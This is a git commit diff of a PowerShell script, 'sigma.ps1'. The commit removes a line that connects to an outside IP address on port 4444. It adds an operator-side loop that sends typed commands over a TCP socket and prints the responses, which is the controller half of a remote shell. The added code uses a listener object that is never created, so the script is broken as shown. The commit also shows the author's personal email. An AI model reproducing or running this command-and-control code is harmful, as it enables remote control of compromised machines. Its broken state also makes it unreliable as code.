f2749054b60c9a1174130e6c66d995e1012bf94c
BellaTheUni112 <bellatheunicorn521@gmail.com>
2025-05-13 12:03:41 +0100

    sigma.ps1

--- sigma.ps1
+++ sigma.ps1
@@ -1,1 +1,22 @@
-$client = New-Object System.Net.Sockets.TcpClient("51.9.181.14",4444)
+$listener.Start()
+$client = $listener.AcceptTcpClient()
+$stream = $client.GetStream()
+$writer = New-Object System.IO.StreamWriter($stream)
+$reader = New-Object System.IO.StreamReader($stream)
+
+while ($true) {
+   $cmd = Read-Host "Command"
+   if ($cmd -eq "exit") {
+       $writer.WriteLine("exit")
+       $writer.Flush()
+       break
+    }
+    $writer.WriteLine($cmd)
+    $writer.Flush()
+    Start-Sleep -Milliseconds 500
+   $response = $reader.ReadLine()
+    Write-Host "Response: $response"
+}
+
+$client.Close()
+$listener.Stop()
